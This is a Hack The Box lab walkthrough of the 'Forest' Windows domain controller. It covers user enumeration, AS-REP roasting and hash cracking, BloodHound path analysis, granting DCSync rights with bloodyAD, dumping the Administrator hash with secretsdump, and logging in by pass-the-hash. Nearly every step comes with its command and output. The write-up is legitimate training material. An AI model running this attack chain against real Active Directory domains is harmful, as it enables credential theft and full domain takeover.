---
categories:
- Hackthebox
image:
  path: forest.png
layout: post
media_subpath: /assets/images/forest
tags:
- hackthebox
- writeup
- windows
- active-directory
- asreproasting
- bloodhound
- genericall
- dcsync
- exchange
- account-operators
- easy
title: HTB - Forest Walkthrough
---

## Introduction

Forest is a easy-difficulty Windows domain controller that demonstrates several Active Directory attack techniques. The attack path involves AS-REP roasting to obtain credentials for a service account, enumerating BloodHound to identify group membership chains, leveraging Account Operators group privileges to modify Exchange Windows Permissions, and finally adding DCSync rights to extract the Administrator hash.

## Reconnaissance

Initial `nmap` scan reveals a Windows domain controller with standard AD services:

```
nmap -sCV -oA nmap/Forest 10.129.95.210
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-09 04:29 -0400
Nmap scan report for 10.129.95.210
Host is up (0.17s latency).
Not shown: 988 closed tcp ports (reset)
PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2026-05-09 08:36:40Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: 2h26m58s, deviation: 4h02m30s, median: 6m57s
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-time: 
|   date: 2026-05-09T08:36:52
|_  start_date: 2026-05-09T08:33:03
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2026-05-09T01:36:53-07:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 63.54 seconds
```

**Key Findings:**

- Domain: `htb.local`
- Hostname: `FOREST.htb.local`
- OS: Windows Server 2016 Standard
- WinRM enabled on port 5985

Add domain to hosts file:

```
echo '10.129.95.210   FOREST.htb.local htb.local FOREST' | sudo tee -a /etc/hosts
```

## SMB Enumeration

Anonymous and guest SMB access are restricted:

```
nxc smb FOREST.htb.local -u '' -p '' --shares
SMB         10.129.95.210   445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True) (Null Auth:True)
SMB         10.129.95.210   445    FOREST           [+] htb.local\: 
SMB         10.129.95.210   445    FOREST           [-] Error enumerating shares: STATUS_ACCESS_DENIED

nxc smb FOREST.htb.local -u 'guest' -p '' --shares
SMB         10.129.95.210   445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True) (Null Auth:True)
SMB         10.129.95.210   445    FOREST           [-] htb.local\guest: STATUS_ACCOUNT_DISABLED 
```

## RPC User Enumeration

Using `rpcclient` to enumerate domain users (null session allowed):

```
rpcclient -N -U "" 10.129.95.210
rpcclient $> enumdomusers 
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
rpcclient $>
```

**Valid Users Extracted:**

```
Administrator
Guest
krbtgt
DefaultAccount
$331000-VK4ADACQNUCA
sebastien
lucinda
svc-alfresco
andy
mark
santi
```

Save to `users.txt` for further testing.

## AS-REP Roasting

### Technical Concept: AS-REP Roasting

**What is AS-REP Roasting?**

Kerberos authentication normally requires pre-authentication - the client encrypts a timestamp with their password hash before requesting a TGT. However, if a user has the `Do not require Kerberos preauthentication` flag (`UF_DONT_REQUIRE_PREAUTH`) enabled:

1. Anyone can request a TGT for that user without knowing their password
2. The KDC responds with an encrypted TGT (AS-REP)
3. The TGT is encrypted with the user's password hash
4. This hash can be cracked offline
    

**For a detailed explanation of Kerberos authentication and AS-REP roasting, refer to my [Kerberos Attacks writeup](https://0xnullc0de.github.io/posts/rebound-hackthebox/).**

### Testing for AS-REP Roastable Users

```
GetNPUsers.py -no-pass htb.local/ -usersfile users.txt -outputfile hashes/aesrep
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-alfresco@HTB.LOCAL:47cf2a314ed2a667e42054e804b98e7c$9f92bdfb08526ed46b8129261ee76b4043df97a27aaad1d78c2573b2110081b768465fc594ca7ad4dd66704442a1ae66c7234e75ce738a5466299bf34a2fd56d9b2f35ed894307432a31613b2891b9f49dcdea3a6c1699b16fa8d4aaeef93c6acff1b9e7d3eba2d51e07b149b8e51b47643ffe2fd86855ff158c3f6e3d2c9f4c7537a96092159f51afbc659a7dca3422dc1ed26f34a2b175d291e8457ee62a68a8cf1dc092cfb18e4f30f4fc0bb61743ff9bf0875907f4c49b1c25729cdeaa993e716ea124fa79f02ec3e8a1e178108aa973648684534e627758f3d0c729898c1f3b38e3ab97
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
                                                       
```

**Result:** `svc-alfresco` is vulnerable!

Using `hashcat` with mode 18200 (Kerberos 5 AS-REP):

```
hashcat hashes/aesrep /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting in autodetect mode
<...SNIP...>

$krb5asrep$23$svc-alfresco@HTB.LOCAL:47cf2a314ed2a667e42054e804b98e7c$9f92bdfb08526ed46b8129261ee76b4043df97a27aaad1d78c2573b2110081b768465fc594ca7ad4dd66704442a1ae66c7234e75ce738a5466299bf34a2fd56d9b2f35ed894307432a31613b2891b9f49dcdea3a6c1699b16fa8d4aaeef93c6acff1b9e7d3eba2d51e07b149b8e51b47643ffe2fd86855ff158c3f6e3d2c9f4c7537a96092159f51afbc659a7dca3422dc1ed26f34a2b175d291e8457ee62a68a8cf1dc092cfb18e4f30f4fc0bb61743ff9bf0875907f4c49b1c25729cdeaa993e716ea124fa79f02ec3e8a1e178108aa973648684534e627758f3d0c729898c1f3b38e3ab97:s3rvice
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$svc-alfresco@HTB.LOCAL:47cf2a314ed2a6...e3ab97
Time.Started.....: Sat May  9 04:47:22 2026 (6 secs)
Time.Estimated...: Sat May  9 04:47:28 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:   921.2 kH/s (2.96ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 4087808/14344385 (28.50%)
Rejected.........: 0/4087808 (0.00%)
Restore.Point....: 4083712/14344385 (28.47%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: s523480 -> s2704081
Hardware.Mon.#01.: Temp: 64c Util: 73%

Started: Sat May  9 04:46:34 2026
Stopped: Sat May  9 04:47:30 2026
```

**Cracked Password:** `s3rvice`

**Credentials:** `svc-alfresco:s3rvice`

## Initial Access

### WinRM Access

The `svc-alfresco` account has WinRM access:

```
nxc winrm FOREST.htb.local -u 'svc-alfresco' -p 's3rvice'    
WINRM       10.129.95.210   5985   FOREST           [*] Windows 10 / Server 2016 Build 14393 (name:FOREST) (domain:htb.local) 
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.95.210   5985   FOREST           [+] htb.local\svc-alfresco:s3rvice (Pwn3d!)
```

### Shell Access

```
evil-winrm -i FOREST.htb.local -u 'svc-alfresco' -p 's3rvice'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> 
```

**User flag:** `C:\Users\svc-alfresco\Desktop\user.txt`

## Privilege Escalation

### Privilege Check

```
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop>
```

No direct privileges - need to escalate.

## BloodHound Analysis

Synchronize time for Kerberos:

```
sudo ntpdate 10.129.95.210
2026-05-09 05:06:00.316105 (-0400) -0.017645 +/- 0.086899 10.129.95.210 s1 no-leap
```

Collect BloodHound data:

```
bloodhound-python -c All -d htb.local -u svc-alfresco -p s3rvice -ns 10.129.95.210 --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: htb.local
INFO: Getting TGT for user
INFO: Connecting to LDAP server: FOREST.htb.local
INFO: Testing resolved hostname connectivity dead:beef::4817:36a8:2e4b:971b
INFO: Trying LDAP connection to dead:beef::4817:36a8:2e4b:971b
INFO: Testing resolved hostname connectivity dead:beef::18e
INFO: Trying LDAP connection to dead:beef::18e
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: FOREST.htb.local
INFO: Testing resolved hostname connectivity dead:beef::4817:36a8:2e4b:971b
INFO: Trying LDAP connection to dead:beef::4817:36a8:2e4b:971b
INFO: Testing resolved hostname connectivity dead:beef::18e
INFO: Trying LDAP connection to dead:beef::18e
INFO: Found 32 users
INFO: Found 76 groups
INFO: Found 2 gpos
INFO: Found 15 ous
INFO: Found 20 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: EXCH01.htb.local
INFO: Querying computer: FOREST.htb.local
INFO: Done in 01M 59S
INFO: Compressing output into 20260509050611_bloodhound.zip
```

### BloodHound Attack Path

![img](Pasted image 20260509051358.png)

**The Path Revealed:**

```text
svc-alfresco 
    → Member of Account Operators
        → Can modify Exchange Windows Permissions
            → Exchange Windows Permissions can DCSync
```
**What This Means:**

- `svc-alfresco` is in `Account Operators` group
- `Account Operators` has `GenericAll` on `Exchange Windows Permissions` group
- By adding ourselves to `Exchange Windows Permissions`, we inherit DCSync rights
    

## Understanding the Permission Chain

### Technical Concept: Nested Group Permissions and DCSync

**Why can we add DCSync after joining Exchange Windows Permissions?**

1. **Account Operators Group Privileges:**
    
    - Built-in group with permissions to create/modify most non-administrator accounts and groups
    - In this domain, Account Operators has `GenericAll` on `Exchange Windows Permissions`
        
2. **GenericAll Permission:**
    
    - Full control over the target object
    - Allows adding/removing members from a group
    - Allows modifying group attributes
    - Allows changing group ownership
3. **Exchange Windows Permissions Group:**
    
    - Built-in group created when Exchange is installed
    - Has extended rights for directory replication (DCSync)
    - Members can request replication of directory data
4. **The Delegation Chain:**
    
    - Account Operators → GenericAll → Exchange Windows Permissions → DCSync rights

**Why the Many Groups Matter:**

The group nesting is critical here. If Account Operators had directly granted DCSync, it would be too powerful. Instead, the permissions flow through multiple groups:

```text
Account Operators
    ↓ (has GenericAll on)
Exchange Windows Permissions
    ↓ (has DCSync rights)
Domain Replication
```

This layered approach means we need to traverse this chain to reach our goal.

### Alternative: Adding a Machine Account

Another way to abuse DCSync rights is to:

1. Add a machine account (computer object)
2. Give that machine account DCSync rights
3. Use the machine account to dump hashes

This can be more stealthy as machine accounts are less monitored than user accounts.

## Exploitation

### Step 1: Grant GenericAll to Exchange Windows Permissions

```
bloodyAD -d htb.local -u svc-alfresco -p s3rvice --host 10.129.95.210 add genericAll 'Exchange Windows Permissions' svc-alfresco
[+] svc-alfresco has now GenericAll on Exchange Windows Permissions
```

### Step 2: Add Ourselves to Exchange Windows Permissions

```
bloodyAD -u svc-alfresco -p s3rvice -d htb.local --host 10.129.95.210 add groupMember "Exchange Windows Permissions" svc-alfresco 
[+] svc-alfresco added to Exchange Windows Permissions
```

**What This Does:** We are now a member of the group that has DCSync rights.

### Step 3: Grant DCSync Rights to Ourselves

```
bloodyAD -d htb.local -u svc-alfresco -p s3rvice --host 10.129.95.210 add dcsync svc-alfresco                                    
[+] svc-alfresco is now able to DCSync
```

**Why We Can Do This:** Being in `Exchange Windows Permissions` gives us the `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` extended rights.

### Technical Concept: DCSync Attack

**What is DCSync?**  
DCSync is a technique that allows an attacker to simulate a domain controller and request replication of directory data. With the right permissions, you can extract all password hashes from Active Directory.

**Required Permissions:**

- `DS-Replication-Get-Changes`
- `DS-Replication-Get-Changes-All`

These permissions are typically held by:

- Domain Controllers
- Domain Admins
- Enterprise Admins
- Exchange Windows Permissions (in some configurations)

## Domain Compromise

### Dumping Administrator Hash


```
secretsdump.py 'htb.local/svc-alfresco:s3rvice'@10.129.95.210 -just-dc-user Administrator
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
[*] Kerberos keys grabbed
htb.local\Administrator:aes256-cts-hmac-sha1-96:910e4c922b7516d4a27f05b5ae6a147578564284fff8461a02298ac9263bc913
htb.local\Administrator:aes128-cts-hmac-sha1-96:b5880b186249a067a5f6b814a23ed375
htb.local\Administrator:des-cbc-md5:c1e049c71f57343b
[*] Cleaning up... 
```

**Administrator NTLM Hash:** `32693b11e6aa90eb43d32c72a07ceea6`

### Complete NTDS Dump (Optional)

```
secretsdump.py 'htb.local/svc-alfresco:s3rvice'@10.129.95.210
```

### Final Shell as Administrator

```
evil-winrm -i FOREST.htb.local -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

**Root flag:** `C:\Users\Administrator\Desktop\root.txt`


